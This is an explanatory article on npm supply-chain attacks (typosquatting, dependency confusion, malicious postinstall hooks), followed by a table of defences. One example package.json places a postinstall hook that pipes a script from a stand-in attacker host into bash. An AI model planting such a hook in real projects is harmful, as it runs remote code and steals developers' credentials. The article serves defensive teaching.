The open-source JavaScript ecosystem relies on mutual trust. When you run `npm install`, you execute code written by hundreds of strangers on your local machine and production servers.

Attackers exploit this trust model by targetting the **supply chain**—corrupting dependencies before they ever reach your application code. Because security tools like `package-lock.json` verify **integrity (has the file changed?)** rather than **safety (is the code malicious?)**, supply chain attacks pass standard hash verification cleanly.

Here is a breakdown of the three most common npm supply chain attack vectors, how they operate, and how to defend against them.

---

## 1. Typosquatting

Typosquatting targets human typing errors and oversight. Attackers publish malicious packages with names visually or phonetically similar to popular open-source libraries, hoping developers will mistype an `npm install` command or copy-paste a flawed snippet.

```text
 Target Package (Legitimate):        cross-env  (Millions of downloads)
 Typosquatted Package (Malicious):   crossenv   (Steals environment variables)
                                     cross-envv
                                     croos-env

```

### How the Attack Works

1. **Publication:** The attacker creates a package with a misspelled name (`expresss`, `react-domm`, `coffee-script`).
2. **Mimicry:** The malicious package often re-exports the exact functionality of the real library so the application continues to run without throwing immediate errors.
3. **Payload Execution:** Hidden inside the initialization or installation files is malicious code designed to steal `.env` secrets, SSH keys, or cloud credentials and exfiltrate them to a remote C2 (Command & Control) server.

---

## 2. Dependency Confusion (Substitution Attack)

Discovered by researcher Alex Birsan, **Dependency Confusion** exploits how package managers resolve dependencies when a project mixes **private internal packages** with **public npm registry packages**.

```text
 ┌────────────────────────────────────────────────────────────────────────┐
 │ PRIVATE ENTERPRISE REGISTRY (@internal/auth-utils: v1.0.0)             │
 └───────────────────────────────────┬────────────────────────────────────┘
                                     │
                 Developer runs: npm install @internal/auth-utils
                                     │
                                     ▼
 ┌────────────────────────────────────────────────────────────────────────┐
 │ PUBLIC NPM REGISTRY (Attacker published: @internal/auth-utils: v99.0.0) │
 └───────────────────────────────────┬────────────────────────────────────┘
                                     │
         npm chooses v99.0.0 because higher semver takes precedence!
                                     │
                                     ▼
                      [ MALICIOUS CODE EXECUTED ]

```

### How the Attack Works

1. **Reconnaissance:** An attacker discovers the names of an organization's private, internal npm packages (often leaked via public GitHub repositories, client-side bundle source maps, or `.npmrc` files).
2. **Registry Flooding:** The attacker publishes a package with the **exact same name** on the public `registry.npmjs.org`, but tags it with an arbitrarily high version number (e.g., `v99.0.0`).
3. **Flawed Resolution:** If the target organization’s build server or developer machine is misconfigured to query both public and private registries without explicit scoping rules, npm sees `v99.0.0` on the public registry as newer than `v1.0.0` on the internal registry and pulls the attacker's public payload.

---

## 3. Malicious `postinstall` Lifecycle Scripts

npm package manifests (`package.json`) allow package authors to define lifecycle scripts (`preinstall`, `install`, `postinstall`) that execute automatically during `npm install`.

```json
{
  "name": "useful-utility",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node ./scripts/setup.js && curl -s https://attacker.com/steal.sh | bash"
  }
}

```

### How the Attack Works

1. **Account Takeover / Maintenance Abandonment:** An attacker buys an abandoned domain of a popular package maintainer, steals an un-maintaned package's npm credentials via credential stuffing, or submits a Trojanized Pull Request that gets merged.
2. **Hooking Lifecycle Scripts:** The attacker adds a `postinstall` hook to `package.json`.
3. **Silent Local Execution:** The second a developer or CI server runs `npm install`, node executes the shell script with the **full OS permissions of the user running the command**. No code inside the application even needs to `require()` or `import` the package—the payload executes before installation even finishes.

---

## Defense Matrix: How to Guard Against Supply Chain Attacks

| Attack Vector     | Primary Risk                              | Defense & Mitigations                                                 |
| ----------------- | ----------------------------------------- | --------------------------------------------------------------------- |
| **Typosquatting** | Human typing errors, copying bad snippets | • Use IDE autocomplete / package search instead of manual typing.<br> |

<br>• Use lockfile linting & socket/Snyk IDE plugins to flag zero-download packages. |
| **Dependency Confusion** | Misconfigured internal package resolution | • Reserve **npm Organization Scopes** (`@my-company/package`) on public npm.<br>

<br>• Configure `.npmrc` with strict registry scoping (`@my-company:registry=[https://private.registry.com](https://private.registry.com)`). |
| **Malicious `postinstall**` | Arbitrary code execution during install | • Run `npm install --ignore-scripts` by default.<br>

<br>• Explicitly whitelist trusted build scripts using `@lavamoat/allow-scripts` or `pnpm.onlyBuiltDependencies`. |
